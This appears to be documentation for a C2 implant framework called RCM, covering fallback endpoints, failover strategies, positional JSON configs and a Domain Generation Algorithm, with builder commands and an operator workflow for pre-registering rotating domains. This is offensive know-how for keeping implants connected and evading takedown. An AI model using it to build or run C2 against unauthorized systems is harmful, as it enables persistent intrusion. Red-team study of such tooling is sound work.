# Fallback & DGA

RCM has two complementary mechanisms for maintaining connectivity when the primary C2 is unreachable: static fallback endpoints and the Domain Generation Algorithm (DGA).

---

## Static Fallback Endpoints

Fallback endpoints let the agent try multiple C2 addresses. Each endpoint can have its own transport, malleable profile, and proxy settings.

### Configuration

Pass a fallback JSON file to the builder:
```bash
cargo run --bin builder -- \
  --host primary.com --port 443 --transport https \
  --fallback-file fallback_profiles/staged_infrastructure.json
```

### Strategies

| Strategy | Tag | Behavior |
|----------|-----|----------|
| `priority` | `2` | Try lowest priority number first; fall to next on failure |
| `round_robin` | `0` | Cycle through endpoints in order, skip dead |
| `random` | `1` | Weighted random selection across alive endpoints |
| `failover` | `3` | Use first until dead, permanently switch to next |

In the JSON file the strategy is given as its **u8 tag** (second element of the top-level array), not as a name string.

### Fallback File Format (positional JSON)

> **Breaking change:** the fallback file is now a **positional JSON array** with no
> field names (this keeps field-name strings out of the agent binary). Old
> object-format files (`{"endpoints": [...], "strategy": "priority", ...}`) **no
> longer parse** — the builder rejects them with
> `Invalid fallback JSON (expected positional array format)`, and anywhere a parse
> error is swallowed the config silently falls back to defaults. **Convert your
> files before building.** All templates in `fallback_profiles/` are already
> converted.

Top level (`FallbackConfig`) — a 3-element array:

| Index | Field | Type | Default if omitted |
|-------|-------|------|--------------------|
| 0 | `endpoints` | array of endpoint arrays | `[]` |
| 1 | `strategy` | u8 tag (see Strategies) | `2` (priority) |
| 2 | `dead_time_secs` | number | `300` |

Each endpoint (`FallbackEndpoint`) — an 8-element array. Trailing elements may be
omitted and fall back to the defaults shown:

| Index | Field | Type | Default | Description |
|-------|-------|------|---------|-------------|
| 0 | `host` | string | *(required)* | C2 hostname or IP |
| 1 | `port` | number | *(required)* | C2 port |
| 2 | `transport` | u8 tag | `0` | `0`=tls, `1`=tcp_plain, `2`=named_pipe, `3`=http, `4`=https |
| 3 | `profile` | array or `null` | `null` | Per-endpoint malleable profile override (positional, see [Builder Guide](builder.md#profile--fallback-file-formats-positional-json)) |
| 4 | `proxy` | array or `null` | `null` | Per-endpoint proxy override: `[use_system, url, username, password]` |
| 5 | `priority` | number | `0` | Lower = tried first (priority/failover) |
| 6 | `weight` | number | `1` | Higher = more likely (random) |
| 7 | `max_failures` | number | `5` | Mark dead after N consecutive failures |

Example (`fallback_profiles/simple_failover.json` — two HTTPS servers, failover strategy, 10-minute dead time):

```json
[
  [
    ["primary-c2.example.com", 443, 4, null, null, 0, 1, 3],
    ["backup-c2.example.com", 443, 4, null, null, 1, 1, 5]
  ],
  3,
  600
]
```

### Dead Endpoint Handling

When an endpoint accumulates `max_failures` consecutive failures it is marked dead for `dead_time_secs` (default 300). After the dead time expires it is retried. If all endpoints are dead simultaneously, all are reset so the agent continues attempting rather than going silent.

### Pre-Built Templates

| File | Scenario |
|------|----------|
| `simple_failover.json` | Two servers, primary + backup |
| `multi_cloud_round_robin.json` | Spread across AWS/Azure/GCP |
| `redirector_chain.json` | Fast redirector + slow CDN fallback |
| `corporate_proxy.json` | HTTPS through corp proxy + direct TLS backup |
| `mixed_transport.json` | HTTPS -> TLS -> named pipe cascade |
| `weighted_random.json` | 60/30/10 weighted distribution |
| `staged_infrastructure.json` | Short-haul (disposable) + long-haul (persistent) |

See `fallback_profiles/` for full JSON examples.

---

## Domain Generation Algorithm (DGA)

The DGA extends the fallback system with algorithmically-derived domains. Both the agent and the operator compute the same domain list from a shared seed, so the operator can pre-register the domains before the agent needs them - without hard-coding them in the binary.

### How It Works

1. **Seed**: A per-campaign `u64` is embedded at build time with `--dga-seed`.
2. **Window**: The current Unix timestamp divided by `--dga-window` (default 86400 s = 1 day) gives a window index. The domain set rotates on each window boundary.
3. **Generation**: For each index `0..count`, the algorithm mixes `(seed, window, index)` through FNV-1a and maps the output to a syllable-based hostname (e.g., `bekal.com`, `torinvex.net`). The result looks like a plausible-but-unregistered domain rather than a hash string.
4. **TLD sampling**: The TLD is selected from `--dga-tlds` using high bits of the hash, keeping it separate from the hostname generation.
5. **Integration**: DGA domains are appended to the fallback list with `priority ≥ 100`, lower than any statically-configured endpoint. They activate only after all explicit endpoints have been exhausted.

### Algorithm Properties

- **Deterministic** - same `(seed, window)` always produces identical domains on any host.
- **Seed-isolated** - different seeds produce statistically independent domain sets. Changing the seed effectively rotates the campaign's infrastructure fingerprint.
- **Window-rotated** - domains change on a schedule the operator controls. The default is daily; shorter windows increase resilience at the cost of more pre-registration.
- **No external dependencies** - pure arithmetic, no RNG state. Works identically on x86-64 Linux, Windows, and macOS.

### Operator Workflow

```bash
# 1. Choose a seed and build an agent
cargo run --bin builder -- \
  --host primary.example.com --port 4443 --transport tls --platform linux \
  --dga-seed 9183726450 --dga-count 16 --dga-tlds com,net,org \
  --sleep 30

# 2. On the operator side, compute today's domains:
#    window = floor(unix_now / 86400)
#    For each i in 0..16: derive domain from (seed=9183726450, window, i)
#
# 3. Register those 16 domains pointing to your infrastructure
#    before deploying the agent.
#
# 4. Each day, compute and register the next window's domains
#    before the old window expires.
```

A utility script (`tools/dga_precompute.py`) can generate the domain list for any seed and date range:
```bash
python3 tools/dga_precompute.py --seed 9183726450 --days 7 --tlds com,net,org
```

### Builder Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--dga-seed <u64>` | *(disabled)* | Per-campaign seed. Required to enable DGA. |
| `--dga-window <secs>` | `86400` | Rotation interval. |
| `--dga-count <n>` | `16` | Domains per window. |
| `--dga-tlds <list>` | `com,net,org` | Comma-separated TLDs to sample. |

### Example: DGA + Static Fallback Together

```json
[
  [
    ["primary.example.com", 443, 4, null, null, 0],
    ["backup.example.com", 4443, 0, null, null, 10]
  ],
  2,
  300
]
```
(`4` = https, `0` = tls, strategy tag `2` = priority; trailing endpoint fields default to weight `1`, max_failures `5`.)
```bash
cargo run --bin builder -- \
  --host primary.example.com --port 443 --transport https --platform linux \
  --fallback-file my_fallback.json \
  --dga-seed 9183726450 --dga-count 16
```
The agent tries `primary` (priority 0), then `backup` (priority 10), then the 16 DGA domains (priority 100-115).